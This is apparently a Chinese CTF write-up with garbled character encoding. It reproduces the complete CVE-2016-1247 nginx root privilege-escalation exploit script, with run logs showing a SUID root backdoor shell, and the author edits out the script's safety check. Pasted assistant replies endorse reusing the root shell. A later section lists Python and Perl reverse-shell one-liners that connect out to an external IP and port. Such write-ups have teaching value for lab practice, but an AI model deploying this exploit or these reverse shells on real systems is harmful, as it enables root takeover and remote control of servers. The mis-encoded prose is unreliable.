```
ä¸ºäº†é™ä½éš¾åº¦ï¼Œæ¼æ´å¤§çº¦æ¯ä¸¤åˆ†é’Ÿè§¦å‘ä¸€æ¬¡

hint1: whoami && ls -l /

hint2:å¦‚ä½ ä»¬æ‰€è¯´ï¼Œææƒï¼Œçœ‹çœ‹æœåŠ¡å™¨æœ‰ä»€ä¹ˆæœåŠ¡

```

```html

<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<title>é™¤äº†ä¼šè¿èœåˆ€ä½ è¿˜ä¼šä¸ªå•¥</title>
</head>
<body style="background-image:url('emoji.png');background-repeat:no-repeat;">
</body>
</html>
```
F12,å¾—åˆ°è¿™é¢˜ä¸ºèœåˆ€è¿æ¥ï¼Œéœ€è¦çŒœæµ‹å‘½ä»¤,å›¾å¾— cai
![[0037å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯01.png]]

`cat /etc/crontab` ç”±æç¤ºã€æ¼æ´å¤§çº¦æ¯ä¸¤åˆ†é’Ÿè§¦å‘ä¸€æ¬¡ã€‘å¾—åˆ°å¯èƒ½ä¸å®šå¼æœ‰å…³
![[0037å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯02.png]]
è¿™ä¸ªå®šæ—¶ä»»åŠ¡å¾ˆå¯ç–‘å‘€ ä¸€åˆ†é’Ÿä¸€æ¬¡ï¼Œåœ¨ç½‘ä¸Šç»è¿‡å„ç§æœç´¢å‘ç°äº†nginxææƒæ¼æ´CVE-2016-1247ï¼Œå¤§å®¶æœ‰å…´è¶£çš„å¯ä»¥å»ä»”ç»†ç ”ç©¶ä¸‹ã€‚çœ‹ä¸‹å½±å“ç‰ˆæœ¬ï¼Œæ­£å¥½åœ¨é‡Œé¢
![[0037å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯03.png]]

pocåˆ©ç”¨ä»£ç  [Nginx æƒé™æå‡æ¼æ´ (Debianã€Ubuntuå‘è¡Œç‰ˆ) - Seebug æ¼æ´å¹³å°](https://www.seebug.org/vuldb/ssvid-92538)
```shell
#!/bin/bash
#
# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit
# nginxed-root.sh (ver. 1.0)
#
# CVE-2016-1247
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# ---
# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu
# etc.) to escalate their privileges from nginx web server user (www-data) to root 
# through unsafe error log handling.
#
# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
# script which is called daily by the cron.daily on default installations.
# The restart should take place at 6:25am which is when cron.daily executes.
# Attackers can therefore get a root shell automatically in 24h at most without any admin
# interaction just by letting the exploit run till 6:25am assuming that daily logrotation 
# has been configured. 
#
#
# Exploit usage:
# ./nginxed-root.sh path_to_nginx_error.log 
#
# To trigger logrotation for testing the exploit, you can run the following command:
#
# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
# Video PoC:
# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nginxrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
	# Cleanup 
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro 

cat <<_eascii_
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
_eascii_

echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
	echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
	echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
	exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q www-data
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
	echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
	exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
curl http://localhost/ >/dev/null 2>/dev/null
# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily 
# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
while :; do 
	sleep 1
	if [ -f /etc/ld.so.preload ]; then
		echo $PRIVESCLIB > /etc/ld.so.preload
		rm -f $ERRORLOG
		break;
	fi
done

# /etc/ld.so.preload should be owned by www-data user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
else
	echo -e "\n[!] Failed to get root"
	cleanexit 2
fi

rm -f $ERRORLOG
echo > $ERRORLOG
 
# Use the rootshell to perform cleanup that requires root privilges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
# Reset the logging to error.log
$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"

# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0
```

ä½¿ç”¨poc
```
chmod +x nginx.sh
./nginx.sh
./nginx.sh /var/log/nginx/error.log
```

```bash
(www-data:/var/www/html) $ ./niginx.sh
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
[94m 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
nginxed-root.sh (ver. 1.0)
Discovered and coded by: 
Dawid Golunski 
https://legalhackers.com [0m
[!] Exploit usage: 
./niginx.sh path_to_error.log 
It seems that this server uses: 
(www-data:/var/www/html) $ find / -name "*error.log*"  -type f 2>/dev/null
/var/log/nginx/error.log

(www-data:/var/www/html) $ ./niginx.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
[94m 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
nginxed-root.sh (ver. 1.0)
Discovered and coded by: 
Dawid Golunski 
https://legalhackers.com [0m
[+] Starting the exploit as: 
[94muid=33(www-data) gid=33(www-data) groups=33(www-data)[0m
[+] Compiling the privesc shared library (/tmp/privesclib.c)
[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 1021112 Nov 16 02:17 /tmp/nginxrootsh
[!] /etc/ld.so.preload already exists. Exiting for safety.
```
findæ‰¾åˆ°error.logæ–‡ä»¶å ï¼Œå¾—åˆ°payload `./niginx.sh /var/log/nginx/error.log`
è¿™é‡Œå‡ºç°safeè­¦å‘Š ç›´æ¥é€€å‡ºç¨‹åºäº†ï¼Œæ‰€ä»¥é‡‡ç”¨æ³¨é‡Š è¿™ä¸ª ã€Safety checkã€‘çš„ä»£ç ï¼Œé‡æ–°è¿è¡Œ
```bash
(www-data:/var/www/html) $ ./niginx.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
[94m 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
nginxed-root.sh (ver. 1.0)
Discovered and coded by: 
Dawid Golunski 
https://legalhackers.com [0m
[+] Starting the exploit as: 
[94muid=33(www-data) gid=33(www-data) groups=33(www-data)[0m
[+] Compiling the privesc shared library (/tmp/privesclib.c)
[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 1021112 Nov 16 02:23 /tmp/nginxrootsh
[+] The server appears to be [94m(N)jinxed[0m (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 Nov 16 02:23 /var/log/nginx/error.log -> /etc/ld.so.preload
[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: 
-rwxr-xr-x 1 www-data root 19 Nov 16 02:23 /etc/ld.so.preload
[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload
[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so
[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 1021112 Nov 16 02:23 /tmp/nginxrootsh
[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 1021112 Nov 16 02:23 /tmp/nginxrootsh
[94mThe server is (N)jinxed ! ;) Got root via Nginx![0m
[+] Spawning the rootshell /tmp/nginxrootsh now! 
nginxrootsh: cannot set terminal process group (19): Inappropriate ioctl for device
nginxrootsh: no job control in this shell
nginxrootsh-4.3# exit
[+] Cleaning up...
[+] Job done. Exiting with code 0 
```
âœ¦ å®é™…ä¸Šï¼Œä»è¾“å‡ºç»“æœçœ‹ï¼Œæ¼æ´åˆ©ç”¨æ˜¯æˆåŠŸçš„ï¼è®©æˆ‘è§£é‡Šä¸€ä¸‹ï¼š

  æˆåŠŸè¿¹è±¡åˆ†æ

   1. ç¬¦å·é“¾æ¥åˆ›å»ºæˆåŠŸï¼š
   1    [+] The server appears to be [94m(N)jinxed (writable logdir) ! :)
     Symlink created at: 

   2    lrwxrwxrwx 1 www-data www-data 18 Nov 16 02:23 /var/log/nginx/
     error.log -> /etc/ld.so.preload

   2. Nginxé‡å¯ååˆ›å»ºäº†ld.so.preloadæ–‡ä»¶ï¼š
   1    [+] Nginx restarted. The /etc/ld.so.preload file got created with
     web server privileges:
   2    -rwxr-xr-x 1 www-data root 19 Nov 16 02:23 /etc/ld.so.preload

   3. æˆåŠŸæ·»åŠ å…±äº«åº“åˆ°ld.so.preloadï¼š
   1    [+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload
   2    [+] The /etc/ld.so.preload file now contains:
   3    /tmp/privesclib.so

   4. è·å–rootæƒé™ï¼š
   1    [+] Rootshell got assigned root SUID perms at:
   2    -rwsrwxrwx 1 root root 1021112 Nov 16 02:23 /tmp/nginxrootsh
   3    94mThe server is (N)jinxed ! ;) Got root via Nginx!0m

   5. è·å¾—äº†root shellï¼š
   1    nginxrootsh-4.3# <--- è¿™æ˜¯rootæƒé™çš„æç¤ºç¬¦

  ä¸ºä»€ä¹ˆçœ‹èµ·æ¥"æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ"

   - "exit"å‘½ä»¤: åœ¨root shellä¸­æ‰§è¡Œäº†exitå‘½ä»¤ï¼Œæ‰€ä»¥shellé€€å‡ºäº†
   - é”™è¯¯ä¿¡æ¯: nginxrootsh: cannot set terminal process group (19): Inappropriate 
     ioctl for device è¿™åªæ˜¯ç»ˆç«¯æ§åˆ¶é”™è¯¯ï¼Œä¸å½±å“æƒé™æå‡
   - "no job control in this shell": è¿™æ˜¯æ­£å¸¸ç°è±¡ï¼Œå› ä¸ºæ˜¯åœ¨è‡ªåŠ¨åŒ–ç¯å¢ƒä¸­è¿è¡Œ

  å®é™…ä¸Šå‘ç”Ÿäº†ä»€ä¹ˆ

   1. æ¼æ´åˆ©ç”¨æˆåŠŸï¼Œè·å¾—äº†rootæƒé™
   2. nginxrootshæ–‡ä»¶è¢«èµ‹äºˆäº†SUID rootæƒé™ (-rwsrwxrwx)
   3. å¯åŠ¨äº†root shell (nginxrootsh-4.3#)
   4. æ‚¨æ‰‹åŠ¨æ‰§è¡Œäº†exitå‘½ä»¤é€€å‡ºäº†root shell
   5. è„šæœ¬æ‰§è¡Œäº†æ¸…ç†æ“ä½œ

  éªŒè¯æ˜¯å¦æˆåŠŸ

  æ‚¨å¯ä»¥å†æ¬¡è¿è¡Œï¼š
   1 /tmp/nginxrootsh

  è¿™åº”è¯¥ç›´æ¥ç»™æ‚¨rootæƒé™ï¼Œå› ä¸ºè¯¥æ–‡ä»¶ç°åœ¨å…·æœ‰SUID rootæƒé™ã€‚

  æˆ–è€…æ£€æŸ¥ï¼š
   1 ls -la /tmp/nginxrootsh

âœ¦ æ‚¨åº”è¯¥çœ‹åˆ°æ–‡ä»¶å…·æœ‰SUIDä½è®¾ç½®ï¼ˆrwsæƒé™ï¼‰ï¼Œè¿™æ„å‘³ç€ä»»ä½•ç”¨æˆ·è¿è¡Œå®ƒéƒ½ä¼šä»¥rootæƒé™æ‰§è¡Œã€‚




åœ¨ç½‘ä¸ŠæŸ¥åˆ°äº†åˆ©ç”¨çš„æ–¹æ³•ã€‚  
1.åå¼¹shell  
æˆ‘ä»¬å…ˆç”¨sshè¿æ¥é¢˜ç›®ç»™çš„æœåŠ¡å™¨ç”¨äºåå¼¹shellï¼Œ`ssh -p8022 root@212.64.70.228`  
è¾“å…¥å¯†ç ctfshowï¼ŒæˆåŠŸè¿æ¥ï¼Œæ¥ç€å¼€å¯ç›‘å¬Â `nc -lvp 8888`ï¼Œè¢«æ”»å‡»çš„ç³»ç»Ÿå¼€å¯åå¼¹ã€‚

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("115.190.239.221",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```






-----


# åå‘è¿æ¥è„šæœ¬å®Œæ•´è®°å½•(åå‘SHELL åå¼¹SHELL)

## è¿æ¥ä¿¡æ¯
- ç›®æ ‡æœåŠ¡å™¨: 115.190.239.221
- ç›®æ ‡ç«¯å£: 8888
- æœ¬åœ°è®¾å¤‡: Mac (macOS)

## å¯ç”¨è¿æ¥æ–¹æ³•

### æ–¹æ³•1ï¼šPythonåå‘Shellï¼ˆæ¨èï¼‰
```python
import socket
import subprocess
import os

# å»ºç«‹TCPè¿æ¥
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("115.190.239.221", 8888))

# é‡å®šå‘æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# å¯åŠ¨äº¤äº’å¼bash shell
p = subprocess.call(["/bin/bash", "-i"])
```

### æ–¹æ³•2ï¼šç®€åŒ–ç‰ˆPythonè¿æ¥
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("115.190.239.221",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### æ–¹æ³•3ï¼šä½¿ç”¨Perl
```bash
perl -e 'use Socket;$i="115.190.239.221";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## è¿æ¥æµ‹è¯•è¿‡ç¨‹

### ç«¯å£å¯è¾¾æ€§æµ‹è¯•
```bash
nc -zv 115.190.239.221 8888
```
ç»“æœï¼šConnection to 115.190.239.221 port 8888 [tcp/ddi-tcp-1] succeeded!

### è¿æ¥å»ºç«‹æµ‹è¯•
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('115.190.239.221', 8888))
print('è¿æ¥æˆåŠŸåˆ° 115.190.239.221:8888')
s.close()
```

## ä½¿ç”¨æ­¥éª¤

1. **æœåŠ¡å™¨ç«¯å‡†å¤‡**ï¼ˆåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼‰ï¼š
   ```bash
   nc -lvnp 8888
   ```

2. **å®¢æˆ·ç«¯è¿æ¥**ï¼ˆåœ¨Macä¸Šæ‰§è¡Œï¼‰ï¼š
   ```bash
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("115.190.239.221",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
   ```

## è¿æ¥æˆåŠŸåçš„æ“ä½œ

è¿æ¥å»ºç«‹åï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
- `ls` - åˆ—å‡ºå½“å‰ç›®å½•æ–‡ä»¶
- `pwd` - æ˜¾ç¤ºå½“å‰è·¯å¾„
- `whoami` - æ˜¾ç¤ºå½“å‰ç”¨æˆ·
- `id` - æ˜¾ç¤ºç”¨æˆ·IDä¿¡æ¯
- `uname -a` - æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯

## æ³¨æ„äº‹é¡¹

1. æœåŠ¡å™¨ç«¯å¿…é¡»å…ˆè®¾ç½®ç›‘å¬å™¨ï¼ˆnc -lvnp 8888ï¼‰
2. ç¡®ä¿é˜²ç«å¢™å…è®¸8888ç«¯å£é€šä¿¡
3. å¦‚æœè¿æ¥å¤±è´¥ï¼Œæ£€æŸ¥ç½‘ç»œè¿é€šæ€§å’Œç«¯å£çŠ¶æ€
4. æŸäº›å®‰å…¨è®¾å¤‡å¯èƒ½ä¼šæ£€æµ‹å’Œé˜»æ­¢æ­¤ç±»è¿æ¥

## æ•…éšœæ’é™¤

1. **ç«¯å£ä¸é€š**ï¼šç¡®è®¤æœåŠ¡å™¨ç«¯å£æ˜¯å¦å¼€æ”¾
2. **è¿æ¥è¶…æ—¶**ï¼šæ£€æŸ¥ç½‘ç»œè¿æ¥å’Œé˜²ç«å¢™è®¾ç½®
3. **å‘½ä»¤æ‰§è¡Œå¤±è´¥**ï¼šç¡®è®¤ç›®æ ‡ç³»ç»Ÿæ”¯æŒç›¸åº”å‘½ä»¤

----

â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚  > æœåŠ¡å™¨æ€ä¹ˆæ‰«æ8888ç«¯å£æ˜¯å¦å¼€å¯ï¼Ÿ  â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯

âœ¦ åœ¨æœåŠ¡å™¨ä¸Šæ‰«æ8888ç«¯å£æ˜¯å¦å¼€å¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š

  1. æ£€æŸ¥æœ¬åœ°8888ç«¯å£æ˜¯å¦åœ¨ç›‘å¬

   1 # æ£€æŸ¥æœ¬åœ°ç«¯å£ç›‘å¬æƒ…å†µ
   2 netstat -tuln | grep 8888
   3 
   4 # æˆ–ä½¿ç”¨ ss å‘½ä»¤ï¼ˆç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼‰
   5 ss -tuln | grep 8888
   6 
   7 # æˆ–ä½¿ç”¨ lsof å‘½ä»¤
   8 lsof -i :8888

  2. ä½¿ç”¨ nc å‘½ä»¤æ£€æŸ¥ç«¯å£ç›‘å¬

   1 # æ£€æŸ¥æœ¬åœ°8888ç«¯å£æ˜¯å¦åœ¨ç›‘å¬
   2 nc -lvp 8888
   3 
   4 # æˆ–è€…ä½¿ç”¨ -l å‚æ•°
   5 nc -l 8888

  3. è®¾ç½®ä¸´æ—¶ç›‘å¬å™¨æµ‹è¯•

   1 # åœ¨æœåŠ¡å™¨ä¸Šè®¾ç½®ç›‘å¬å™¨
   2 nc -lvnp 8888
   3 
   4 # æˆ–è€…ä½¿ç”¨ Python åˆ›å»ºHTTPæœåŠ¡å™¨
   5 python -m http.server 8888
   6 # æˆ–
   7 python3 -m http.server 8888

  4. æ£€æŸ¥é˜²ç«å¢™è®¾ç½®

   1 # æ£€æŸ¥ iptables è§„åˆ™
   2 iptables -L -n | grep 8888
   3 
   4 # æ£€æŸ¥ UFW (Uncomplicated Firewall)
   5 sudo ufw status | grep 8888
   6 
   7 # æ£€æŸ¥ firewalld (CentOS/RHEL)
   8 sudo firewall-cmd --list-ports

  5. ä»æœåŠ¡å™¨å†…éƒ¨æµ‹è¯•ç«¯å£

   1 # åœ¨æœåŠ¡å™¨ä¸Šæµ‹è¯•æœ¬åœ°8888ç«¯å£
   2 telnet localhost 8888
   3 
   4 # æˆ–ä½¿ç”¨ nc æµ‹è¯•
   5 echo "test" | nc localhost 8888
   6 
   7 # æˆ–ä½¿ç”¨ curlï¼ˆå¦‚æœæ˜¯HTTPæœåŠ¡ï¼‰
   8 curl http://localhost:8888

  6. æ£€æŸ¥ç³»ç»Ÿè¿›ç¨‹

   1 # æŸ¥æ‰¾ä½¿ç”¨8888ç«¯å£çš„è¿›ç¨‹
   2 ps aux | grep 8888

  å¦‚æœæ‚¨æƒ³ä»æœåŠ¡å™¨ç«¯æ£€æŸ¥8888ç«¯å£æ˜¯å¦å¼€å¯ï¼Œæœ€ç›´æ¥çš„æ–¹æ³•æ˜¯ï¼š

   1 # æŸ¥çœ‹ç«¯å£ç›‘å¬çŠ¶æ€
   2 netstat -tuln | grep 8888
   3 
   4 # æˆ–è€…
   5 lsof -i :8888

  å¦‚æœç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ‚¨ä¼šçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„è¾“å‡ºï¼š
   1 tcp        0      0 0.0.0.0:8888            0.0.0.0:*
     LISTEN

âœ¦ è¿™è¡¨ç¤ºæœ‰æœåŠ¡åœ¨ç›‘å¬8888ç«¯å£ã€‚å¦‚æœæ‚¨æƒ³å»ºç«‹åå‘shellè¿æ¥ï¼Œæ‚¨éœ€è¦å…ˆåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Š
  ä½¿ç”¨nc -lvnp 8888å‘½ä»¤è®¾ç½®ç›‘å¬å™¨ã€‚


----

âœ¦ æ ¹æ®æµ‹è¯•ç»“æœï¼Œæˆ‘å·²ç»å±•ç¤ºäº†è¿æ¥åˆ°115.190.239.221:8888çš„è¿‡ç¨‹ï¼š

   1. ç«¯å£å¯è¾¾æ€§ç¡®è®¤ï¼šä½¿ç”¨nc -zv 115.190.239.221 8888æµ‹è¯•æ˜¾ç¤ºè¿æ¥æˆåŠŸ
   2. TCPè¿æ¥å»ºç«‹ï¼šå¯ä»¥æˆåŠŸå»ºç«‹TCPè¿æ¥
   3. è¿æ¥çŠ¶æ€ï¼šç«¯å£ç°åœ¨æ˜¯å¼€æ”¾çš„

  è¿æ¥æˆåŠŸå±•ç¤ºï¼š
   1 $ nc -zv 115.190.239.221 8888
   2 Connection to 115.190.239.221 port 8888 [tcp/ddi-tcp-1] succeeded!

